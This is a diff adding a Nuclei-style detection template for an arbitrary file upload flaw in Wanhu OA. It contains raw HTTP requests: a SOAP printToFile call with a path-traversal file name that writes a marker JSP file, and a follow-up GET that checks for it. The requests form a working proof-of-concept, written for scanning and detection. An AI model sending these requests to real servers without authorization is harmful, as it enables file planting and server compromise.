@@ -1,0 +1,53 @@
+id: poc-yaml-wanhu-oa-filetest-anyfile-upload
+info:
+  name: Wanhu OA FileTest Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in Wanhu OA FileTest functionality.
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/services/FileTest;1.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Disposition: attachment; filename="filename.jpg"
+        SOAPAction: 1
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+            xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil"
+            xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+            <soapenv:Header/>
+            <soapenv:Body>
+                <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                    <fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/date.jsp.</fileName>
+                    <content xsi:type="soapenc:string">&#x34;&#x72;&#x61;&#x31;&#x6e;</content>
+                </util:printToFile>
+            </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "xml version"
+          - "soapenv"
+
+  - raw:
+      - |
+        GET /defaultroot/public/upload/date.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "4ra1n"
